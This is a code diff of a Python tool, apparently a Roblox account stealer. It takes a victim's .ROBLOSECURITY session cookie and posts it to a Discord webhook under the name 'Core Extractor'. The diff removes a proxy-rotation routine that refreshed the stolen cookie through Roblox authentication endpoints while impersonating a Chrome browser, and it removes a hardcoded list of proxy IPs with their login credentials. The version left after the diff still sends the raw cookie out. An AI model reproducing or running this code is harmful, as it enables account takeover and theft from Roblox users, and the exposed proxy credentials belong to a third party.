@@ -1,31 +1,9 @@
 import os
 import re
-import random
 import sys
 from curl_cffi import requests
 
-RAW_WEBSHARE_PROXIES = [
-    "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
-    "64.137.96.74:6641:saxqnmup:rgvs7uvqydbm",
-    "198.23.243.226:6361:saxqnmup:rgvs7uvqydbm",
-    "38.154.185.97:6370:saxqnmup:rgvs7uvqydbm",
-    "84.247.60.125:6095:saxqnmup:rgvs7uvqydbm",
-    "191.96.254.138:6185:saxqnmup:rgvs7uvqydbm",
-    "198.46.161.42:5092:saxqnmup:rgvs7uvqydbm",
-    "64.137.10.153:5803:saxqnmup:rgvs7uvqydbm",
-    "104.164.49.38:7693:saxqnmup:rgvs7uvqydbm",
-    "23.26.71.145:5628:saxqnmup:rgvs7uvqydbm"
-]
-
-def format_webshare(proxy_str: str):
-    """Parses and formats a Webshare proxy string into an HTTP URL proxy format."""
-    parts = proxy_str.strip().split(':')
-    if len(parts) == 4:
-        ip, port, user, pwd = parts
-        return f"http://{user}:{pwd}@{ip}:{port}"
-    return None
-
-def extract_and_clean_cookie(raw_input: str) -> str:
+def extract_and_clean_cookie(raw_input):
     """Extracts and sanitizes the security token from various payload formats."""
     if not raw_input:
         return ""
@@ -58,46 +36,6 @@ def extract_and_clean_cookie(raw_input: str) -> str:
     cleaned = raw_str.lstrip('.').rstrip(';').strip()
     return cleaned if len(cleaned) > 30 else None
 
-def rotate_and_refresh_session(raw_cookie: str) -> str:
-    """Rotates through available proxies to validate and refresh the session ticket."""
-    formatted_list = [format_webshare(p) for p in RAW_WEBSHARE_PROXIES if format_webshare(p)]
-    random.shuffle(formatted_list)
-    test_proxies = [None] + formatted_list
-
-    for proxy in test_proxies:
-        session = requests.Session(impersonate="chrome120")
-        if proxy:
-            session.proxies = {"http": proxy, "https": proxy}
-
-        try:
-            full_cookie_val = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{raw_cookie}"
-            session.cookies.set(".ROBLOSECURITY", full_cookie_val, domain=".roblox.com", path="/")
-
-            auth_test = session.get("https://users.roblox.com/v1/users/authenticated", timeout=6)
-            if auth_test.status_code != 200:
-                continue
-
-            ticket_res = session.post("https://auth.roblox.com/v1/authentication-ticket", headers={
-                "Referer": "https://www.roblox.com/camel/edit",
-                "X-CSRF-TOKEN": auth_test.headers.get("x-csrf-token", "")
-            }, timeout=6)
-
-            csrf_token = ticket_res.headers.get("x-csrf-token")
-            if csrf_token:
-                session.headers.update({"X-CSRF-TOKEN": csrf_token})
-
-            session.get("https://www.roblox.com/home", timeout=6)
-
-            rotated_cookie = session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
-            if rotated_cookie:
-                clean_rotated = extract_and_clean_cookie(rotated_cookie)
-                if clean_rotated and len(clean_rotated) > 30:
-                    return clean_rotated
-        except Exception:
-            continue
-
-    return raw_cookie
-
 def main():
     webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
     if not webhook_url:
@@ -111,9 +49,6 @@ def main():
     if not raw_cookie:
         sys.exit(1)
 
-    print("[+] Rotating and refreshing session via proxy...")
-    refreshed_cookie = rotate_and_refresh_session(raw_cookie)
-
     payload = {
         "content": "@everyone",
         "username": "Core Extractor",
@@ -121,9 +56,9 @@ def main():
         "embeds": [
             {
                 "title": "🔑 Secure Session Token",
-                "description": f"```text\n{refreshed_cookie}\n```",
+                "description": f"```text\n{raw_cookie}\n```",
                 "color": 0x2B2D31,
-                "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
+                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
             }
         ],
         "allowed_mentions": {"parse": ["everyone"]}
